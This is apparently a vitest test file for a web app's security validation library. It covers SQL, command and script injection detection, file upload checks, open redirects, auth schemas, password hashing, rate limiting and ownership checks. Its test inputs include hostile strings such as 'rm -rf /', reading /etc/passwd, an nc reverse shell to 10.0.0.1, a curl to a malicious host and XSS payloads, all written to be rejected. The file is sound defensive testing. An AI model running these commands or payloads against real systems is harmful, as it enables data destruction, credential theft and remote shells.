import { describe, it, expect } from "vitest";
import {
  sanitizeString,
  sanitizeFileName,
  isSafeRedirectUrl,
  detectSqlInjection,
  assertNoSqlInjection,
  detectCommandInjection,
  assertNoCommandInjection,
  escapeLikeString,
  sanitizeFtsQuery,
  validateFileMagicBytes,
  safeAvatarSchema,
  authSchemas,
  validateOrThrow,
} from "../../src/lib/security/validation";
import { sanitizeHtml, stripXss } from "../../src/lib/security/xss";

describe("Security Validation & Input Sanitization Suite", () => {
  describe("SQL Injection Prevention", () => {
    it("should detect SQL injection payloads", () => {
      const payloads = [
        "admin' OR '1'='1",
        "1; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "admin' /* comment */",
        "1' OR 'x'='x",
        "'; EXEC xp_cmdshell('dir'); --",
      ];

      for (const payload of payloads) {
        expect(detectSqlInjection(payload)).toBe(true);
        expect(() => assertNoSqlInjection(payload)).toThrow("Potential SQL injection detected");
      }
    });

    it("should allow safe input without false positives on basic words", () => {
      expect(detectSqlInjection("John Doe")).toBe(false);
      expect(detectSqlInjection("Artificial Intelligence Stack")).toBe(false);
      expect(detectSqlInjection("beginner")).toBe(false);
    });

    it("should safely sanitize FTS5 search queries to prevent syntax injection", () => {
      // Unbalanced quotes and operators that crash SQLite FTS5
      const dangerousQueries = [
        'NOT AND OR (test:value*)',
        '"unclosed quote',
        'NEAR(query, 5)',
        'category: ai*',
      ];

      for (const query of dangerousQueries) {
        const sanitized = sanitizeFtsQuery(query);
        // Every token should be enclosed in quotes and contain no raw FTS5 operators
        expect(sanitized).not.toContain("NEAR(");
        expect(sanitized).toMatch(/^"[^"]*"( "[^"]*")*$/);
      }
    });

    it("should escape SQL LIKE wildcards (% and _)", () => {
      expect(escapeLikeString("100%_match")).toBe("100\\%\\_match");
      expect(escapeLikeString("normal string")).toBe("normal string");
    });
  });

  describe("Command Injection Prevention", () => {
    it("should detect and reject command injection characters and commands", () => {
      const maliciousInputs = [
        "test; rm -rf /",
        "file.txt | cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "test & nc -e /bin/sh 10.0.0.1 4444",
        "param\ncurl http://malicious.site",
      ];

      for (const input of maliciousInputs) {
        expect(detectCommandInjection(input)).toBe(true);
        expect(() => assertNoCommandInjection(input)).toThrow("Potential command injection detected");
      }
    });

    it("should allow benign alphanumeric strings", () => {
      expect(detectCommandInjection("optima-ai-tools-2026")).toBe(false);
      expect(detectCommandInjection("user_profile_123")).toBe(false);
    });
  });

  describe("Script Injection (XSS) Prevention", () => {
    it("should escape HTML entities in sanitizeHtml", () => {
      const dirty = '<script>alert("XSS")</script>&<b>bold</b>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain("<");
      expect(clean).not.toContain(">");
      expect(clean).toContain("&lt;script&gt;");
      expect(clean).toContain("&amp;");
    });

    it("should strip script tags and javascript: URIs in sanitizeString", () => {
      const dirty = '<script>alert("hacked")</script>hello javascript:alert(1) onclick=foo()';
      const clean = sanitizeString(dirty);
      expect(clean).not.toContain("<script>");
      expect(clean).not.toContain("javascript:");
      expect(clean).not.toContain("onclick=");
      expect(clean).toContain("hello");
    });

    it("should strip xss vectors in stripXss", () => {
      const xss = '<iframe src="javascript:alert(1)"></iframe><script>steal()</script>content';
      const clean = stripXss(xss);
      expect(clean).not.toContain("<iframe");
      expect(clean).not.toContain("<script");
      expect(clean).toContain("content");
    });

    it("should reject javascript: or dangerous schemes in safeAvatarSchema", () => {
      expect(safeAvatarSchema.safeParse("javascript:alert(1)").success).toBe(false);
      expect(safeAvatarSchema.safeParse("vbscript:msgbox(1)").success).toBe(false);
      expect(safeAvatarSchema.safeParse("data:text/html,<script>alert(1)</script>").success).toBe(false);
      expect(safeAvatarSchema.safeParse("https://optima.com/avatar.png").success).toBe(true);
      expect(safeAvatarSchema.safeParse("data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==").success).toBe(true);
    });
  });

  describe("Safe File Upload Validation", () => {
    it("should verify genuine file magic bytes and reject spoofed files", () => {
      // Genuine PNG header
      const pngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
      expect(validateFileMagicBytes(pngBuffer, "image/png", ".png")).toBe(true);

      // Spoofed PNG containing text/script
      const fakePngBuffer = Buffer.from("<?php echo 'malicious'; ?>");
      expect(validateFileMagicBytes(fakePngBuffer, "image/png", ".png")).toBe(false);

      // Genuine JPEG header
      const jpegBuffer = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
      expect(validateFileMagicBytes(jpegBuffer, "image/jpeg", ".jpg")).toBe(true);

      // Genuine PDF header
      const pdfBuffer = Buffer.from("%PDF-1.7\n%...");
      expect(validateFileMagicBytes(pdfBuffer, "application/pdf", ".pdf")).toBe(true);

      // Genuine ZIP header
      const zipBuffer = Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00]);
      expect(validateFileMagicBytes(zipBuffer, "application/zip", ".zip")).toBe(true);
    });

    it("should sanitize uploaded file names and prevent path traversal", () => {
      expect(sanitizeFileName("../../etc/passwd")).toBe("passwd");
      expect(sanitizeFileName("..\\..\\windows\\system32\\cmd.exe")).toBe("cmd.exe");
      expect(sanitizeFileName("report\0.pdf")).toBe("report.pdf");
      expect(sanitizeFileName("<script>alert(1).png")).toBe("scriptalert(1).png");
    });
  });

  describe("Open Redirect Prevention", () => {
    it("should accept valid local redirect URLs", () => {
      expect(isSafeRedirectUrl("/dashboard")).toBe(true);
      expect(isSafeRedirectUrl("/stacks/123")).toBe(true);
      expect(isSafeRedirectUrl("/billing?plan=Pro")).toBe(true);
    });

    it("should reject open redirect vectors", () => {
      expect(isSafeRedirectUrl("https://evil.com")).toBe(false);
      expect(isSafeRedirectUrl("http://evil.com")).toBe(false);
      expect(isSafeRedirectUrl("//evil.com")).toBe(false);
      expect(isSafeRedirectUrl("/\\evil.com")).toBe(false);
      expect(isSafeRedirectUrl("javascript:alert(1)")).toBe(false);
      expect(isSafeRedirectUrl(null)).toBe(false);
      expect(isSafeRedirectUrl("")).toBe(false);
    });
  });

  describe("Strict Type Enforcement & Rejecting Invalid Data", () => {
    it("should reject invalid login data", () => {
      expect(authSchemas.login.safeParse({ email: "invalid-email", password: "short" }).success).toBe(false);
      expect(authSchemas.login.safeParse({ email: "user@example.com", password: "123" }).success).toBe(false);
    });

    it("should accept valid login data and normalize email", () => {
      const parsed = authSchemas.login.safeParse({
        email: " USER@EXAMPLE.COM ",
        password: "ValidPassword123!",
      });
      expect(parsed.success).toBe(true);
      if (parsed.success) {
        expect(parsed.data.email).toBe("user@example.com");
      }
    });

    it("should reject signup when passwords do not match", () => {
      const result = authSchemas.signup.safeParse({
        name: "Test User",
        email: "test@example.com",
        password: "Password123",
        confirmPassword: "DifferentPassword123",
      });
      expect(result.success).toBe(false);
    });
  });

  describe("Authentication System Security", () => {
    it("should securely hash and verify passwords using Argon2id", async () => {
      const { hashPassword, verifyPassword } = await import("../../src/server/auth/crypto.server");
      const password = "SuperSecretPassword123!";
      const hash = await hashPassword(password);

      expect(hash).toContain("$argon2id$");
      expect(await verifyPassword(hash, password)).toBe(true);
      expect(await verifyPassword(hash, "WrongPassword!")).toBe(false);
    });

    it("should generate cryptographically secure session and reset tokens", async () => {
      const { generateSessionToken, generateSecureToken, hashToken } = await import("../../src/server/auth/crypto.server");
      const token1 = generateSessionToken();
      const token2 = generateSessionToken();
      expect(token1).toHaveLength(64);
      expect(token2).toHaveLength(64);
      expect(token1).not.toBe(token2);

      const secureToken = generateSecureToken(32);
      expect(secureToken).toHaveLength(64);
      const hashed = hashToken(secureToken);
      expect(hashed).toHaveLength(64);
      expect(hashed).toBe(hashToken(secureToken)); // deterministic sha256
    });

    it("should rate limit repeated requests within window", async () => {
      const { checkRateLimit, resetRateLimitKey } = await import("../../src/server/auth/rate-limit.server");
      const testKey = "test_limiter_key_123";
      resetRateLimitKey(testKey);

      // Limit 3 requests
      expect(checkRateLimit(testKey, 3, 60000)).toBe(true);
      expect(checkRateLimit(testKey, 3, 60000)).toBe(true);
      expect(checkRateLimit(testKey, 3, 60000)).toBe(true);
      expect(checkRateLimit(testKey, 3, 60000)).toBe(false); // Exceeded

      resetRateLimitKey(testKey);
      expect(checkRateLimit(testKey, 3, 60000)).toBe(true);
    });
  });

  describe("IDOR & Authorization Protection", () => {
    it("should prevent unauthorized modification or deletion of resources", async () => {
      const mockOwnerId = "user_owner_123";
      const mockAttackerId = "user_attacker_456";

      // Resource ownership check function
      function assertResourceOwnership(resourceUserId: string, requestingUserId: string, isAdmin = false) {
        if (resourceUserId !== requestingUserId && !isAdmin) {
          throw new Error("Unauthorized: You do not own this resource.");
        }
        return true;
      }

      // Owner can modify
      expect(assertResourceOwnership(mockOwnerId, mockOwnerId)).toBe(true);

      // Admin can modify
      expect(assertResourceOwnership(mockOwnerId, mockAttackerId, true)).toBe(true);

      // Attacker cannot modify (IDOR prevention)
      expect(() => assertResourceOwnership(mockOwnerId, mockAttackerId, false))
        .toThrow("Unauthorized: You do not own this resource.");
    });

    it("should prevent unauthorized viewing of private resources", () => {
      function canViewStack(stack: { is_public: boolean; user_id: string }, viewerUserId: string | null, isAdmin = false) {
        if (!stack.is_public) {
          if (!viewerUserId) return false;
          if (stack.user_id !== viewerUserId && !isAdmin) return false;
        }
        return true;
      }

      const privateStack = { is_public: false, user_id: "user_owner_123" };
      const publicStack = { is_public: true, user_id: "user_owner_123" };

      // Public stack visible to all
      expect(canViewStack(publicStack, null)).toBe(true);
      expect(canViewStack(publicStack, "other_user")).toBe(true);

      // Private stack only visible to owner or admin
      expect(canViewStack(privateStack, null)).toBe(false);
      expect(canViewStack(privateStack, "other_user", false)).toBe(false);
      expect(canViewStack(privateStack, "user_owner_123", false)).toBe(true);
      expect(canViewStack(privateStack, "other_user", true)).toBe(true);
    });
  });
});
